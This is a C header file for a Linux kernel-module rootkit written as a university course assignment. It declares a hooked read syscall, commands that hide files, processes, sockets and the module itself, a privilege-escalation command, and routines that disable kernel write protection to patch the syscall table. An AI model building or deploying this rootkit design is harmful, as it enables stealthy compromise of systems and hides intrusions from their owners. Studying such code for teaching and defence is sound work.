
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: rootkit.h                                                       */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: Header file for kernel module `rootkit.c`.                         */
/*                                                                             */
/*******************************************************************************/

#ifndef __ROOTKIT__
#define __ROOTKIT__

/* Definition of macros */
#define CR0_WRITE_PROTECT_MASK (1 << 16)

#define COMMAND_PREFIX		"r00t+"

#define HIDE_FILE			"hide_file"
#define UNHIDE_FILE			"unhide_file"
#define HIDE_PROCESS		"hide_process"
#define UNHIDE_PROCESS		"uhide_process"
#define HIDE_MODULE			"hide_module"
#define UNHIDE_MODULE		"unhide_module"
#define HIDE_SOCKET_TCP4	"hide_socket_tcp4"
#define UNHIDE_SOCKET_TCP4	"unhide_socket_tcp4"
#define HIDE_SOCKET_UDP4	"hide_socket_udp4"
#define UNHIDE_SOCKET_UDP4	"unhide_socket_udp4"
#define HIDE_SOCKET_TCP6	"hide_socket_tcp6"
#define UNHIDE_SOCKET_TCP6	"unhide_socket_tcp6"
#define HIDE_SOCKET_UDP6	"hide_socket_udp6"
#define UNHIDE_SOCKET_UDP6	"unhide_socket_udp6"
#define ESCALATE_PRIVIL 	"escalate_privil"

#define MATCHING_PREFIX		0
#define MATCHING_COMMAND	1
#define MATCHING_PARAMETER	2

#define COMMAND_BUF_LEN		20
#define PARAMETER_BUF_LEN	128

/* Definition of global variables */

static int state;
static int prefix_matched_so_far;
static int command_buf_index;
static int parameter_buf_index;
static int parameter_exists;
static char command_buf[COMMAND_BUF_LEN];
static char parameter_buf[PARAMETER_BUF_LEN];

void **syscall_table;
asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);

//asmlinkage long (*original_readlinkat_syscall)(int dfd, const char __user *path, char __user *buf, int bufsiz);

/* Declaration of functions */
asmlinkage long my_read_syscall(unsigned int, char __user *, size_t);
static void match_input(char *, long);
static void match_prefix(char);
static void match_command(char);
static void match_parameter(char);
static void execute_command(void);

void disable_write_protect_mode(void);
void enable_write_protect_mode(void);

#endif
